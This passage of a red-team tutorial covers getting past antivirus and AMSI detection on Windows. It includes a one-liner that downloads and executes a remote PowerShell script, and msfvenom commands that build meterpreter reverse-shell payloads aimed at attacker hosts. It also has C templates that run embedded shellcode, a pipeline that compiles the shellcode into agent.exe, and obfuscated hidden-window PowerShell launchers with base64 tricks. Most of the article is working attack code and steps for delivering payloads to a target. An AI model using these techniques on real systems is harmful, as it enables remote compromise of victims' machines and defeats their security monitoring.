- Oneliner AMSI bypass<br />

      powershell.exe -version 2 IEX (New-Object Net.WebClient).DownloadString('ht'+'tp:'+'//19'+'2.16'+'8.1.71/hello.ps1')
      

![AMSI Bypass](http://i68.tinypic.com/2hd88yg.jpg)


- Reflection - Matt Graeber's method<br />

      Matt Graeber (@mattifestation) tweeted an awesome one line AMSI bypass. Like many other things
      by Matt, this is my favorite. It doesn't need elevated shell and there is no notification to the
      user but the automatic script block logging.

<br />

![AMSI Bypass](http://i65.tinypic.com/15hzzvb.png)


[0] [Glosario (Index)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#glosario-index)<br />

---

<br /><br /><br /><br />

## OBFUSCATING THE METASPLOIT TEMPLATE (psh-cmd)

      when we use metasploit to build shellcode, msfvenom uses pre-written templates to embebbed
      the shellcode on it, those templates contain also system calls that migth be detected by
      AMSI mechanism, to avoid that we need to decode the base64 string produced by msfvenom,
      search for the syscalls, obfuscate them, and encode the template again to base64 to be
      embebbed into Unicorn.ps1 article template (or using the default msfvenom template).

<br />

Build shellcode using msfvenom<br />
![obfuscating the template](http://i.cubeupload.com/DLjxC2.png)

Editing msfvenom template<br />
![obfuscating the template](http://i.cubeupload.com/z9bcjh.jpg)

Strip the template to extact only the base64 string (parsing data)<br />
`HINT: Deleting from template the string: %comspec% /b /c start /min powershell.exe -nop -w hidden -e`<br />
![obfuscating the template](http://i.cubeupload.com/ZtyCYd.png)

Decoding the base64 string ..<br />
`This template build by msfvenom also contains powershell syscalls that migth be flagged`<br />
![obfuscating the template](http://i.cubeupload.com/i43jmL.png)

Obfuscate the syscalls..<br />
`HINT: In this example iam only changing the letters from small to big (concaternate)`<br />
![obfuscating the template](http://i.cubeupload.com/ixIFJi.jpg)

Encodind the template again into base64 to be embebbed into unicorn.ps1 (or not)<br />
`HINT: This template only have the syscall's obfuscated, not the 1º funtion deleted [redbox in previous pic]`<br />
![obfuscating the template](http://i.cubeupload.com/AMIPyT.png)

Replace [ ENCODED-SHELLCODE-STRING ] by your new base64 string..<br />
`HINT: now your new obfuscated template its ready to be deliver to target machine`<br />
![obfuscating the template](http://i.cubeupload.com/w7CJtx.png)
`HINT: If your plans are using the msfvenom template, then remmenber to add the follow syscall (obfuscate it)`<br />
`HINT: in the beggining of the template: %comspec% /b /c start /min powershell.exe -noP -wIn hIdDEn -en`<br />


- Final Notes:<br />
there is a tool [AVSignSeek](https://github.com/hegusung/AVSignSeek) that can help us in discovering what flags are beeing detected in our shellcode ..<br />Adicionally we can also obfuscated the meterpreter loader using arno0x0x random bytes stager [here](https://arno0x0x.wordpress.com/2016/04/13/meterpreter-av-ids-evasion-powershell/)<br />


[0] [Glosario (Index)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#glosario-index)<br />

---

<br /><br /><br /><br />

## Bypass the scan engine (daniel sauder: avet)

      This next technic writes a file to disk before executing shellcode into target ram ..
      'Template taken from Avet anti-virus evasion tool presented in blackhat 2017'.

---

![avet bypass](http://i67.tinypic.com/2chpeed.png)

---

<br />

**template.c** from AVET<br />


      #include <stdio.h>
      #include <stdlib.h>
      #include <unistd.h>
      #include <string.h>
      #include <windows.h>
      #include <tchar.h>
      #include <stdlib.h>
      #include <strsafe.h>

      void exec_mycode(unsigned char *mycode)
      {
        int (*funct)();
        funct = (int (*)()) mycode;
        (int)(*funct)();
      }


      int main (int argc, char **argv)
      {
      /*
      msfvenom -p windows/meterpreter/reverse_https lhost=192.168.153.149 lport=443 -e x86/shikata_ga_nai -f c -a x86 --platform Windows
      */

      unsigned char buffer[]= 
      "\xda\xcc\xba\x6f\x33\x72\xc4\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1"
      "\x75\x31\x56\x18\x83\xc6\x04\x03\x56\x7b\xd1\x87\x38\x6b\x97"
      "\x68\xc1\x6b\xf8\xe1\x24\x5a\x38\x95\x2d\xcc\x88\xdd\x60\xe0"
      "\xe9\x88\xb7\xf5\xbc\x2b\x91\x9f\xbe\x78\xe1\xb5";
	
      /*
      Here is the bypass. A file is written, this bypasses the scan engine
      */
        HANDLE hFile;
	hFile= CreateFile(_T("hello.txt"), FILE_READ_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE) 
		exit(0);

	exec_mycode(buffer);
      }

[0] [Glosario (Index)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#glosario-index)<br />
[1] [avepoc - some pocs for antivirus evasion](https://github.com/govolution/avepoc)<br />

---

<br /><br /><br /><br />

## C to ANCII Obfuscation (c-ancii)

- Encoding shellcode from **C** to **ANCII**

      \x8b\x5a\x00\x27\x0d\x0a  <-- C shellcode

      8b5a00270d0a              <-- ANCII shellcode

---

- Build shellcode in **C** format using msfvenom and escaping **bad chars** (-b '\x0a\x0d')

      msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.69 LPORT=666 -b '\x0a\x0d' -f c -o shell.txt

- **Parsing** shellcode data (from C to ANCII)

      # store parsed data into '$store' bash local variable
      store=`cat shell.txt | grep -v '=' | tr -d ';' | tr -d '\"' | tr -d '\\' | tr -d 'x' | tr -d '\n'`

- **template.c** to be injected with generated shellcode

      #include
      #include
      #include
      #include
      #include
      #include
      #include

      <stdio.h>
      <stdlib.h>
      <unistd.h>
      <string.h>
      <windows.h>
      <tchar.h>
      <stdlib.h>

      void exec_mycode(unsigned char *mycode)
      {
      int (*funct)();
         funct = (int (*)()) mycode;
         (int)(*funct)();
      }

      // return pointer to mycode
      unsigned char* decode_mycode(unsigned char *buffer, unsigned char *mycode, int size)
      {
      int j=0;
         mycode=malloc((size/2));
         int i=0;
      do
      {
      unsigned char temp[3]={0};
         sprintf((char*)temp,”%c%c”,buffer[i],buffer[i+1]);
         mycode[j] = strtoul(temp, NULL, 16);
         i+=2;
         j++;
      } while(i<size);
         return mycode;
      }
         int main (int argc, char **argv)
      {
         unsigned char *mycode;

      unsigned char buffer[]=
      "INSERT_SHELLCODE_HERE";

      int size = sizeof(buffer);
         mycode = decode_mycode(buffer,mycode,size);
         exec_mycode(mycode);
      }


<br />

- **Inject** parsed shellcode into **template.c**

      # inject shellcode into template.c using SED bash command
      sed -i "s/INSERT_SHELLCODE_HERE/$store/" template.c


- Compile template.c with **GCC** software to **.exe**

      gcc.exe template.c -o agent.exe

[0] [Glosario (Index)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#glosario-index)<br />

---

<br /><br /><br /><br />

---

## FINAL NOTES - REMARKS

      90% of the obfuscation technics in the 'powershell' section contained in this article are
      based in the exelent 'Invoke-Obfuscation' powershell cmdlet develop by: @danielbohannon.

      Also keep in mind of the most common obfuscations technics like write a file on disk before
      executing any malicious actions (agent execution) or execute obscure funtions, replace any
      main functions (and syscall's) by base64 encoded variables/funtions, and store them inside
      your script (agent) to be called at run-time, also remmenber to use 'Rubish Data' piped (|)
      before your system call's and the last but not least, Tick,Concatenate/splatting all function
      names also to use big and small letters (eg: P`o"W"e^Rs%!h%E^l%0D%L"."e^%i0:~14,1%^E) since
      microsoft's interpreters are not case sensitive (powershell and cmd).

      Less used powershell parameters: powershell.exe -noP -Win hidden -ep ByPass -nonI -en
      check the full list in Referencies URL link [5] http://www.danielbohannon.com/blog-1/
      2017/3/12/powershell-execution-argument-obfuscation-how-it-can-make-detection-easier

      Its never to late to remmenber that diferent technics can be combined together to achieve
      better results. The next example shows one powershell (psh-cmd) payload embbebed into one
      template.bat using 5 diferent batch obfuscation technics found in this article (only batch)

<br />

- demo.bat

      DE-OBFUSCATED : cmd.exe /c powershell.exe -noP -WIn hIdDen -ep bYPaSs -en $ENCODED-SHELLCODE-STRING
      OBFUSCATED    : @c^M%k8%.E"x"%!h% /c =%db%oW%!h%rS^h%!h%lL"."%!h%Xe -%U7%o%db% -W^I%U7% hI%k8%D%!h%%U7% -%!h%p By%db%a^S%AA%s -%!h%%U7% $ENCODED-SHELLCODE-STRING

- demo.bat
![Final notes](http://i65.tinypic.com/20f47xk.png)<br />


- Scripts used in this article (**POCs**):<br />
[1] [undefined-vars.bat](https://pastebin.com/MV0uxDaf) [2] [certutil-dropper.bat](https://pastebin.com/hyBJHAgx) [3] [demo.bat](https://pastebin.com/8KL6rBTF) [4] [Hello.ps1](https://pastebin.com/ELByB5y7) [5] [psh-dropper.ps1](https://pastebin.com/MJ2f20Zs) [6] [Unicorn.ps1](https://pastebin.com/y9qJdGJf)<br />[7] [Invoke-WebRequest.ps1](https://pastebin.com/9VRtFZ1Y) [8] [BitsTransfer.ps1](https://pastebin.com/keaHme3F) [9] [AMSI-bypass.bat](https://pastebin.com/H2kjLCin) [10] [AMSI-Downgrade.ps1](https://pastebin.com/qkkq5bZy)<br />

      The above scripts are meant for article readers to quick test concepts and obfuscation methods
      there is no guaranties that they will bypass AMSI detection [demo scripts] so.. if you are a
      scriptkiddie wanting to have scripts to use, dont.. they are examples .. use what you have
      learned and apply it to your projects ..

---

      Article Reward technic [ re-obfuscation-encoding ] by: r00t-3xp10it
      This technic can be used in cmd.exe | bash or powershell.exe interpreter, but this example
      its written to describe the technic under powershell interpreter (terminal or script.ps1).

<br />

- String command to obfuscate<br />
`Get-WmiObject`

- Tick String to be transformed into base64<br />

      G`et-Wm`iOb`ject

<br />

      1º - Take one obfuscated command and store it into $encode variable
           [String]$encode="G`et-Wm`iOb`ject"   #<-- Use allway an impar number of ` special characters

      2º - Encode the $encode var into a base64 string and store it into $encodeString var
           $encodeString=[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($encode))

      3ª - Display/Copy the reObfuscated base64 string
           Write-Host "Encoded syscall:" $encodeString -ForeGroundColor Green -BackGroundColor black

![powershell obfuscation](http://i63.tinypic.com/wvtlxu.jpg)


<br />

      4º - Add the follow lines to your script.ps1
           $rebOfuscation = "R2VOLVdtaU9iamVjdA=="
           $syscall=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($reObfuscation))
           powershell.exe $syscall -Class Win32_ComputerSystem  #<-- decode the syscall at run-time.

![powershell obfuscation](http://i66.tinypic.com/351cq2w.jpg)

---

### Special thanks
**@danielbohannon** **@AndyGreen** **@enigma0x3** **@ReL1k**<br />
**@404death** **@daniel sauder (avet)** **@Wandoelmo Silva** and<br />
**@Muhammad Samaak <-- for is contributions to this project ^_^**<br />
**@Shanty Damayanti <-- My geek wife for all the misspelling fixes <3**<br />

<br />

### Referencies
[0] [This Article Glosario (Index)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#glosario-index)<br />
[1] [avepoc - some pocs for antivirus evasion](https://github.com/govolution/avepoc)<br />
[2] [danielbohannon - invoke-obfuscation-v11-release](http://www.danielbohannon.com/blog-1/2016/10/1/invoke-obfuscation-v11-release-sunday-oct-9)<br />
[3] [danielbohannon - Invoke-obfuscation Techniques how-to](https://www.sans.org/summit-archives/file/summit-archive-1492186586.pdf)<br />
[4] [varonis - powershell-obfuscation-stealth-through-confusion](https://blog.varonis.com/powershell-obfuscation-stealth-through-confusion-part-i/)<br />
[5] [danielbohannon - powershell-execution-argument-obfuscation](http://www.danielbohannon.com/blog-1/2017/3/12/powershell-execution-argument-obfuscation-how-it-can-make-detection-easier)<br />
[6] [paloaltonetworks - pulling-back-the-curtains-on-encodedcommand-powershell](https://researchcenter.paloaltonetworks.com/2017/03/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/)<br />
[7] [enigma0x3 - bypassing-amsi-via-com-server-hijacking](https://enigma0x3.net/2017/07/19/bypassing-amsi-via-com-server-hijacking/)<br />
[8] [ReL1k - circumventing-encodedcommand-detection-powershell](https://www.trustedsec.com/2017/01/circumventing-encodedcommand-detection-powershell/)<br />
[9] [Satoshi Tanda - amsi-bypass-with-null-character](http://standa-note.blogspot.pt/2018/02/amsi-bypass-with-null-character.html)<br />

<br />

## Author: r00t-3xp10it
# Suspicious Shell Activity (red team) @2018
